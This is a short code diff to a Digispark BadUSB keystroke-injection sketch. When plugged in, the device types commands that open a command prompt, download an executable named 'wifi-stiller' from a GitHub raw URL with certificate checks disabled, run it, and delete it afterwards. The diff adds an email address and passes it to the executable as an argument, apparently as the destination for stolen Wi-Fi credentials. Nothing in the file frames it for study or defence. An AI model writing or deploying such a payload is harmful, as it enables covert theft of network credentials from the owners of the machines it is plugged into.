@@ -9,6 +9,7 @@
 #include <usbconfig.h>
 #include <usbdrv.h>
 #include <usbportability.h>
+#define ADRESS abduragimov.amir12@mail.ru
 
 void setup() {
   DigiKeyboard.enableLEDFeedback();
@@ -25,7 +26,7 @@ void setup() {
   DigiKeyboard.println("cmd");
   DigiKeyboard.delay(2000);
   DigiKeyboard.println("curl --insecure -OL https://raw.githubusercontent.com/sasha4ka/wifi-stiller/master/wifi-stiller.exe");
-  DigiKeyboard.println("wifi-stiller.exe");
+  DigiKeyboard.println("wifi-stiller.exe ADRESS");
   DigiKeyboard.println("del wifi-stiller.exe");
   DigiKeyboard.println("exit");
 }
